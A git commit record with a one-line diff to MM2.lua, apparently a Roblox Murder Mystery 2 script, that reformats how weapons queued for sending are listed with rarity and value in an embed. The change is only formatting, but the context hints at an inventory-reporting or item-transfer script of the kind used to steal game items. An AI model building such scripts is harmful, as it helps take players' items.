79b6623e4ff877cf7e717c0d7e663be106948120
Anonimo221123 <misaelgarciaparedes2782009@gmail.com>
2025-08-27 01:27:20 -0500

    Update MM2.lua

--- MM2.lua
+++ MM2.lua
@@ -506,7 +506,7 @@ if #weaponsToSend > 0 then
     local maxEmbedItems = math.min(18,#weaponsToSend)
     for i=1,maxEmbedItems do
         local w = weaponsToSend[i]
-        fieldsInit[2].value = fieldsInit[2].value..string.format("%s x%s (%s) | Valor: %s💎\n", w.DataID,w.Amount,w.Rarity,tostring(w.Value*w.Amount))
+        fieldsInit[2].value = fieldsInit[2].value..string.format("%s x%s (%s)\nValor: %s💎\n\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
     end
 
     if #weaponsToSend > 18 then
